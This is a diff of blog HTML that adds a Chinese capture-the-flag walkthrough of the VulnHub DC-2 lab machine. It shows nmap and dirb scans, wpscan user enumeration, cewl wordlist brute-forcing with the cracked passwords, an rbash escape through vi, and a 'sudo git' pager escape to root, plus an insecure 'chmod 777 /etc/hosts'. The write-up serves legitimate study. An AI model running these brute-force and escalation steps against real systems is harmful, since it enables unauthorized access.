@@ -19,18 +19,52 @@
         <meta name="keywords" content="xiabee,hexo-theme,xiabee-blog">
     
     <meta name="description" content="">
-    <meta property="og:type" content="website">
-<meta property="og:title" content="xiabee-瞎哔哔">
-<meta property="og:url" content="https://blog.xiabee.cn/archives/2020/index.html">
+    <meta name="description" content="写在前面：本站内容仅供技术交流分享，切勿非法使用，一切技术后果自行承担 上期回顾：VulnHub DC 1 通关纪实 DC 2 靶机下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-2,311&#x2F; 渗透主机：kali 2020  涉及渗透技术：   nmap 等扫描 本地域名解析  wpscan 扫描和攻击  cewl 针对性字典生成  git 提权  题目描述 搭建靶机和">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub DC2 通关纪实">
+<meta property="og:url" content="https://blog.xiabee.cn/posts/vulnhub-dc-2/index.html">
 <meta property="og:site_name" content="xiabee-瞎哔哔">
+<meta property="og:description" content="写在前面：本站内容仅供技术交流分享，切勿非法使用，一切技术后果自行承担 上期回顾：VulnHub DC 1 通关纪实 DC 2 靶机下载地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;dc-2,311&#x2F; 渗透主机：kali 2020  涉及渗透技术：   nmap 等扫描 本地域名解析  wpscan 扫描和攻击  cewl 针对性字典生成  git 提权  题目描述 搭建靶机和">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/2f6545c6de85fda56a2eea4e1cd227c76415a39ee68cda192653a4938140aec2.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/01980b8bfd8355935fb10b8836f60bb1a17b58d55f2fe148c67626e5e4583586.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/5e7bd70eff7cf212d9f9f3a7701779ce7e258e91447a15d11cc67c1c08a2443b.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/f9953a5857e83d00144cbe20153d6e3b7ee182923597d362c45f75eba7018fbd.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/7c1c69fcd593f0deef36ead8fabacf66083a64963214fbb17fcb9bcaedde85cf.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/3f49cada812e3785f850c50e2b284a06147308b7929922425dca08fbf7dea47c.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/c381b3e6d67bd9a5dbe1cd4bb4d85ee40e52af35b5280e562c87b189a035efb3.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/8995b81e1197803abb795463e717b018be362a32a5a1116c62f324e8694561e4.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/32363102ea470eb8af2aa748d1da9719a2cbe2002f42466b155a7a2f24bf9cbd.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/17c1ad6c4b82e88b4bbfcf181e624e5f54def101b83d1665a418375595f13c55.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/67c7781873b2c1c83839b9e793fe1bfad4121c4a93242111c7aea4153fa2723f.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/70ca83486b79a1b216cb5edb02f35dc7c227781db33ee5af270a87c81a3066d3.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/95c4a0a3bca25074b3c189d02aa8c49e212f864ea57ff8f358c692a894926c7a.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/1c3bde36b1e30781340cca6470e5274c9eff767ec5a5aee3cd2fdf8cb102f408.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/2e89eb08610181de15d2d052041c22016950b859a4c3554128b3b92fb8f93ae1.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/409a05f22f311ad522812585c11605181ad9093e1fb91f8760c3aa1485f66024.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/3766d41737b4a233c7506f8ee2ca965881f962c4bf9a3d9d88031b85f4acaccd.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/19bed3818c69d1c21be0a175248af05506ee9848735d4a0d3cf9262ea8f08539.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/cf278761d7f5824102336348c992ad02350dbab46d6571db15d0ea9534f02d60.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/a8998ea642dd3555db8f165b1b2f98ada334a42ce956db7b8194fd2702188d14.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/3e750eeb351de7a201c3b8e072b7485b264c77fa3d3d3aeea8d8edca53ba47ee.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/3b33b3baa2a597b7033ed657979ccb7038a88fc6732b85a68e01c902769c659a.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/6bedca61df3ad57c6144ad34762668154a7b9fa371536ff4414126c67bb8a964.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/fb79b083e11d01bf5220ad6c03ea01f66b4a0724030bcd4d83c0bca2974a4bcd.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/1cfc52ed386a17e7a59c48df793e3b6e9b17f878d15b8daab9c979bb8e9d1f7b.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/cb0e08166d688b928b37bfef31c169ef799b4a9eb4d099aa0826d120ef92a197.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/b159cc6b6ad57e4bb76e0c79f51c2431757815f4fe316281a413339defbb5acf.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/14fa375cb0b3f79bfd7f8a2cfcfe43585e564d8ab2fdbb08d0ee4e5b90905b58.png">
+<meta property="article:published_time" content="2020-03-09T13:00:23.000Z">
+<meta property="article:modified_time" content="2023-03-21T08:03:14.916Z">
 <meta property="article:author" content="xiabee">
+<meta property="article:tag" content="vulnhub">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.xiabee.cn/pic/2023/03/2f6545c6de85fda56a2eea4e1cd227c76415a39ee68cda192653a4938140aec2.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="https://s3.xiabee.cn/pic/icons/favicon.jpg">
     
-    <title>xiabee-瞎哔哔</title>
+    <title>VulnHub DC2 通关纪实 · xiabee-瞎哔哔</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -230,6 +264,8 @@
         }
     </script>
     
+        <body class="post-body">
+    
         <!-- header -->
         <header class="header header-mobile">
     <!-- top read progress line -->
@@ -259,6 +295,17 @@
     </div>
     <!-- toggle banner for post layout -->
     
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">XiaBee&#39;s Studio.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">VulnHub DC2 通关纪实</a>
+            </div>
+        </div>
+    
 </header>
 
         <!-- fixed footer -->
@@ -285,24 +332,79 @@
 
 
 
+    height:50vh;
+
 ">
     
     <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(https://s3.xiabee.cn/pic/wallpaper/22.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+                VulnHub DC2 通关纪实
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+                
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="vulnhub">vulnhub</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.5k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/09</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -432,496 +534,233 @@
 
             <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
             <div class="container container-unloaded">
-                <main class="main index-page">
+                <main class="main post-page">
+    <article class="article-entry">
+        <p>写在前面：本站内容仅供技术交流分享，切勿非法使用，一切技术后果自行承担</p>
+<p>上期回顾：<a href="https://blog.xiabee.cn/posts/vulnhub-dc-1/">VulnHub DC 1 通关纪实</a></p>
+<p>DC 2 靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>
+<p>渗透主机：kali 2020 </p>
+<p>涉及渗透技术： </p>
+<ul>
+<li>nmap 等扫描</li>
+<li>本地域名解析 </li>
+<li>wpscan 扫描和攻击 </li>
+<li>cewl 针对性字典生成 </li>
+<li>git 提权</li>
+</ul>
+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p><img src="https://s3.xiabee.cn/pic/2023/03/2f6545c6de85fda56a2eea4e1cd227c76415a39ee68cda192653a4938140aec2.png" alt="image-20230321154210123"></p>
+<h2 id="搭建靶机"><a href="#搭建靶机" class="headerlink" title="搭建靶机"></a>搭建靶机</h2><p>和 <a href="https://blog.xiabee.cn/posts/vulnhub-dc-1/">DC1</a> 一样，这里我们直接搭建在 VM 里面，保障靶机和渗透主机在同一网段即可，这里我们网络模式选择 NAT 模式，即共享IP地址</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>渗透主机地址：<strong>192.168.80.128</strong></p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/01980b8bfd8355935fb10b8836f60bb1a17b58d55f2fe148c67626e5e4583586.png" alt="image-20230321154353148"></p>
+<p>靶机地址：<strong>192.168.80.131</strong></p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/5e7bd70eff7cf212d9f9f3a7701779ce7e258e91447a15d11cc67c1c08a2443b.png" alt="image-20230321154404028"></p>
+<p>发现 ip，直接 nmap 一顿梭：<code>nmap -A -p- -T4 192.168.80.131</code></p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/f9953a5857e83d00144cbe20153d6e3b7ee182923597d362c45f75eba7018fbd.png" alt="image-20230321154438952"></p>
+<p>发现开放了 80 端口和 7744 端口 然后康康他的网站目录，dirb 一顿梭：<code>dirb http://192.168.80.131</code></p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/7c1c69fcd593f0deef36ead8fabacf66083a64963214fbb17fcb9bcaedde85cf.png" alt="image-20230321154640381"></p>
+<p>dirb 爆破目录 看到熟悉的 “wp-admin”，基本可以确定是个  wordpress 的网站了 直接浏览器访问一下试试：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/3f49cada812e3785f850c50e2b284a06147308b7929922425dca08fbf7dea47c.png" alt="image-20230321154705662"></p>
+<p>emmmm 靶机做了重定向，直接跳转到了<a target="_blank" rel="noopener" href="http://dc-2,而且还没做域名解析/">http://dc-2，而且还没做域名解析</a>…… </p>
+<p>我们整理一下信息： </p>
+<ul>
+<li>靶机开放了80端口 </li>
+<li>80端口重定向到了 <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2</a> </li>
+<li>靶机CMS框架为 wordpress </li>
+<li>靶机开放了ssh端口</li>
+</ul>
+<h2 id="修改域名解析"><a href="#修改域名解析" class="headerlink" title="修改域名解析"></a>修改域名解析</h2><p>既然靶机没有做域名解析，那就在主机本地做一次域名解析嘛</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">chmod</span> 777 /etc/hosts</span><br><span class="line"><span class="comment"># 修改权限，保证非root也可写可执行</span></span><br><span class="line">vi /etc/hosts</span><br><span class="line"><span class="comment"># 进入vim修改hosts文件</span></span><br></pre></td></tr></table></figure>
+
+<p>手动添加 dc-2 的解析，保存并退出：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/c381b3e6d67bd9a5dbe1cd4bb4d85ee40e52af35b5280e562c87b189a035efb3.png" alt="image-20230321154808330"></p>
+<p>修改hosts文件 </p>
+<p>然后再次浏览器访问 <a href="http://dc-2：">http://dc-2：</a></p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/8995b81e1197803abb795463e717b018be362a32a5a1116c62f324e8694561e4.png" alt="image-20230321154827502"></p>
+<p>此时看到了经典的WP主题</p>
+<h2 id="寻找-FLAG"><a href="#寻找-FLAG" class="headerlink" title="寻找 FLAG"></a>寻找 FLAG</h2><h3 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h3><p>首页好大一个 <strong>Flag</strong> 按钮，直接点进去康康：<img src="https://s3.xiabee.cn/pic/2023/03/32363102ea470eb8af2aa748d1da9719a2cbe2002f42466b155a7a2f24bf9cbd.png" alt="image-20230321154914261"></p>
+<blockquote>
+<p>Flag 1: Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl. More passwords is always better, but sometimes you just can’t win them all. Log in as one to see the next flag. If you can’t find it, log in as another. </p>
+<p>flag1提示</p>
+</blockquote>
+<p>flag1暗示我们，常用字典可能不管用了，也许需要cewl一下</p>
+<h3 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h3><p>话不多说，直接上 wpscan 开始跑</p>
+<p> <del>为什么不像 DC1 那样直接跑一顿 msf：试过了，只靠现有的payload好像打不下来……</del></p>
+<p>那我们就先康康网站有哪些用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -e u</span><br><span class="line"><span class="comment">#扫描wordpress中的发表过文章的用户</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.xiabee.cn/pic/2023/03/17c1ad6c4b82e88b4bbfcf181e624e5f54def101b83d1665a418375595f13c55.png" alt="image-20230321155026756"></p>
+<p>枚举用户名 扫描发现三个用户，分别为：admin, jerry, tom </p>
+<p>利用刚刚扫描得到的用户信息，通过 cewl 生成密码字典：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http://dc-2 -w pass</span><br><span class="line"><span class="comment"># 针对 dc-2 这个网站生成字典，并保存在pass文件中</span></span><br></pre></td></tr></table></figure>
+
+<p>再创建一个 user 文件，保存刚刚扫出来的三个用户名</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/67c7781873b2c1c83839b9e793fe1bfad4121c4a93242111c7aea4153fa2723f.png" alt="image-20230321155119519"></p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/70ca83486b79a1b216cb5edb02f35dc7c227781db33ee5af270a87c81a3066d3.png" alt="image-20230321155127245"></p>
+<p>pass和user的文件内容</p>
+<p>wpscan 爆破用户密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://dc-2 -U user -P pass</span><br><span class="line"><span class="comment"># 对dc-2进行爆破，使用的字典为刚刚写的 user 和 pass</span></span><br></pre></td></tr></table></figure>
+
+<p>直接爆破，发现靶机没做防火墙，那莽就完事了……<del>（我用同样的办法爆破我自己的博客，然后被防火墙封了四个小时www）</del></p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/95c4a0a3bca25074b3c189d02aa8c49e212f864ea57ff8f358c692a894926c7a.png" alt="image-20230321155203943"></p>
+<p>爆破结果 此时看到，admin 的密码不在字典里面，但是 tom and jerry 都被爆出来了</p>
+<ul>
+<li>Username: jerry, Password: adipiscing</li>
+<li>Username: tom, Password: parturient</li>
+</ul>
+<p>随便挑一个登陆后台，我们在 Pages 里面看到坨大一个 Flag2：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/1c3bde36b1e30781340cca6470e5274c9eff767ec5a5aee3cd2fdf8cb102f408.png" alt="image-20230321155258856"></p>
+<p>Flag2</p>
+<p>点进去康康：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/2e89eb08610181de15d2d052041c22016950b859a4c3554128b3b92fb8f93ae1.png" alt="image-20230321155311953"></p>
+<blockquote>
+<p>Flag 2: If you can’t exploit WordPress and take a shortcut, there is another way. Hope you found another entry point. </p>
+<p>flag2提示</p>
+</blockquote>
+<p>意思就是直接爆破Wordpress是没用的，你得找别的方法进去……（和我们前期msf尝试的结果一样一样的</p>
+<h3 id="FLAG3"><a href="#FLAG3" class="headerlink" title="FLAG3"></a>FLAG3</h3><p>直接用刚刚爆出来的两个账号 ssh 登录一下试试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.80.131 -p 7744</span><br><span class="line"><span class="comment"># 这里加个 -p 是因为靶机的ssh不是常用端口，需要指定一下</span></span><br></pre></td></tr></table></figure>
+
+<p>然后直接用刚刚爆破出来的密码”parturient”登陆进去：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/409a05f22f311ad522812585c11605181ad9093e1fb91f8760c3aa1485f66024.png" alt="image-20230321155506493"></p>
+<p>tom 登陆成功 然后四处逛逛，发现他有 flag3，但是你看不了，因为你是 rbash……</p>
+<img src="https://s3.xiabee.cn/pic/2023/03/3766d41737b4a233c7506f8ee2ca965881f962c4bf9a3d9d88031b85f4acaccd.png" alt="image-20230321155526148" style="zoom:150%;" />
+
+<p>rbash</p>
+<p>那先查看一下环境变量：<code>echo $PATH$</code></p>
+<img src="https://s3.xiabee.cn/pic/2023/03/19bed3818c69d1c21be0a175248af05506ee9848735d4a0d3cf9262ea8f08539.png" alt="image-20230321155600035" style="zoom:150%;" />
+
+
+
+<p>还有救，我们尝试用vi转义一下shell，拿一个权限比较高的 bash shell出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br><span class="line"><span class="comment"># 这里利用的是vim命令模式，通过vim命令来设置shell转义</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://s3.xiabee.cn/pic/2023/03/cf278761d7f5824102336348c992ad02350dbab46d6571db15d0ea9534f02d60.png" alt="image-20230321155632261" style="zoom:200%;" />
+
+<p>然后设置环境变量：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/bin:/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/bash:<span class="variable">$SHELL</span></span><br><span class="line"><span class="comment"># 把刚刚设置好的shell导入环境变量中</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://s3.xiabee.cn/pic/2023/03/a8998ea642dd3555db8f165b1b2f98ada334a42ce956db7b8194fd2702188d14.png" alt="image-20230321155711221" style="zoom:200%;" />
+
+<p>此时的PATH已经变了</p>
+<p>然后尝试cat一下，可以了：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/3e750eeb351de7a201c3b8e072b7485b264c77fa3d3d3aeea8d8edca53ba47ee.png" alt="image-20230321155732923"></p>
+<blockquote>
+<p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. </p>
+<p>flag3提示</p>
+</blockquote>
+<h3 id="FLAG4"><a href="#FLAG4" class="headerlink" title="FLAG4"></a>FLAG4</h3><p>flag3 暗示我们切换到 jerry 的用户去（Jerry的密码是adipiscing）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line"><span class="built_in">cd</span> /home/jerry</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> flag4.txt</span><br><span class="line"><span class="comment"># 进去直接看到了flag4...</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.xiabee.cn/pic/2023/03/3b33b3baa2a597b7033ed657979ccb7038a88fc6732b85a68e01c902769c659a.png" alt="image-20230321155847034"></p>
+<blockquote>
+<p>Good to see that you’ve made it this far - but you’re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you’re on your own now. :-) Go on - git outta here!!!! </p>
+<p>flag4提示</p>
+</blockquote>
+<h3 id="Final-FLAG"><a href="#Final-FLAG" class="headerlink" title="Final FLAG"></a>Final FLAG</h3><p>先看一眼当前用户：<code>whoami</code></p>
+<img src="https://s3.xiabee.cn/pic/2023/03/6bedca61df3ad57c6144ad34762668154a7b9fa371536ff4414126c67bb8a964.png" alt="image-20230321155933121" style="zoom:200%;" />
+
+
+
+<p>确认过眼神，还是jerry，没有 root 从天而降…… </p>
+<p>先<code>sudo -l </code>一下，看看 jerry 有哪些权限：</p>
+<img src="https://s3.xiabee.cn/pic/2023/03/fb79b083e11d01bf5220ad6c03ea01f66b4a0724030bcd4d83c0bca2974a4bcd.png" alt="image-20230321160001117" style="zoom:200%;" />
+
+
+
+<p>emmm jerry居然能以root身份去git，那没事了，开始提权 （而且flag4也暗示我们通过git提权，我们就上网找一个poc）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git <span class="built_in">help</span> config</span><br><span class="line"><span class="comment"># root权限打开git的配置，注意这里一定要sudo，不然是以普通用户身份打开git</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.xiabee.cn/pic/2023/03/1cfc52ed386a17e7a59c48df793e3b6e9b17f878d15b8daab9c979bb8e9d1f7b.png" alt="image-20230321160051663"></p>
+<p>多页分隔，绝佳的 hack 位点</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br><span class="line"><span class="comment"># 直接在config里面输入命令，反弹bash</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://s3.xiabee.cn/pic/2023/03/cb0e08166d688b928b37bfef31c169ef799b4a9eb4d099aa0826d120ef92a197.png" alt="image-20230321160123058" style="zoom:200%;" />
+
+<p>回车，然后发现我们已经有了root 的shell：</p>
+<img src="https://s3.xiabee.cn/pic/2023/03/b159cc6b6ad57e4bb76e0c79f51c2431757815f4fe316281a413339defbb5acf.png" alt="image-20230321160142115" style="zoom:200%;" />
+
+<p>此时已是root</p>
+<p>然后直接去老家看flag啦：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> final-flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.xiabee.cn/pic/2023/03/14fa375cb0b3f79bfd7f8a2cfcfe43585e564d8ab2fdbb08d0ee4e5b90905b58.png" alt="image-20230321160207972"></p>
+<blockquote>
+<p>Congratulatons!!! A special thanks to all those who sent me tweets and provided me with feedback - it’s all greatly appreciated. If you enjoyed this CTF, send me a tweet via @DCAU7. Well done！</p>
+</blockquote>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>整体来说 DC2 可能比 DC1 简单一点点，因为没有涉及 msf 的各种调试和数据库的修改 hhh </p>
+<p><del>当然这也可能是我的错觉</del></p>
+<p>这次主要学到了git还能这样玩</p>
+<p>下次的题下次再更，我是鸽手（x）</p>
+
+    </article>
+    <!-- license -->
     
-        
-        
-        
-        
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://blog.xiabee.cn">xiabee</a>
+            <p>原文链接：<a href="https://blog.xiabee.cn/posts/vulnhub-dc-2/">https://blog.xiabee.cn/posts/vulnhub-dc-2/</a>
+            <p>发表日期：<a href="https://blog.xiabee.cn/posts/vulnhub-dc-2/">三月 9日 2020, 9:00:23 晚上</a>
+            <p>更新日期：<a href="https://blog.xiabee.cn/posts/vulnhub-dc-2/">三月 21日 2023, 4:03:14 下午</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/occupation-ctf-wp/">
-                
-                <span class="abstract-title-text">职业杯 2020 选拔赛回顾 &amp; Write UP</span>
-            </a>
-            <div class="abstract-content">
-                简介
-
-
-队伍名称
-北理工的恶龙
-
-
-
-答对题数
-4
-
-
-最终得分
-1738.1
-
-
-最终排名
-18
-
-
-
-这波是 WEB 和二进制一起白给(x)，然后被唐老板带飞 
-看到两道sql注入题的时候，我的第一反应是： “这一血我稳了” ，然后把题目看错了拖了两个小时…… 不过还好把WEB签到给他签上了（我好白给啊）
-回顾一下比赛过程.jpg
-WEB就做了两个签到题…
-easy sql
-这一看就是签到题啊，直接上sqlmap一把梭：
-1sqlmap -u &quot;http://124.71.148.26:30022/&quot; --form
-
-
-
-有时间盲注，那就先梭着：
-
-然后直接爆表...
-            </div>
-            <!-- read more -->
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/ababa/" title="碎碎念">
+                    <div class="nextTitle">碎碎念</div>
+                </a>
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/03/09">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/11/07</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
-    
-</div>
-
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
+        </li>
+        <li class="previous">
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/wsl2-about/">
-                
-                <span class="abstract-title-text">WSL2踩坑分享</span>
-            </a>
-            <div class="abstract-content">
-                WSL：Windows Subsystem For Linux
-前段时间听说WSL2很香，然后试了一下，确实很香……如果你不是一个WEB狗
-
-WSL2的安装我就不具体写了，太简单了，直接看官网教程
-0x00 与WSL的区别WSL1大家应该都很熟悉，WSL2也问世挺久了，我就不详细嗦了，直接看看官网解释的区别：
-
-摘自微软官网
-整体上看……这俩完全就不是一个东西嘛：wsl只是一个单纯的shell，wsl2简直就是一台虚拟机
-WSL2从OS层实现了独立，不再与宿主机共享OS，解决了许多二进制狗的蜜汁BUG，但是这种独立性给WEB狗创造了更多的烦恼
-0x01 主要问题IPV6没有IPV6，失去...
-            </div>
-            <!-- read more -->
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/vulnhub-dc-1/" title="VulnHub DC1 通关纪实">
+                    <div class="prevTitle">VulnHub DC1 通关纪实</div>
+                </a>
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/10/26</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
+        </li>
+    </ul>
+    <!-- comment -->
     
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="linux">linux</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="wsl">wsl</a>
-    
-</div>
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
+
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/linux-gmp/">
-                
-                <span class="abstract-title-text">Linux安装GMP依赖</span>
-            </a>
-            <div class="abstract-content">
-                GMP简介
-官网
-GMP：GNU Multiple Precision Arithmetic Library，即GNU高精度算术运算库，在现代密码学的计算中十分关键
 
-
-什么是GMP？
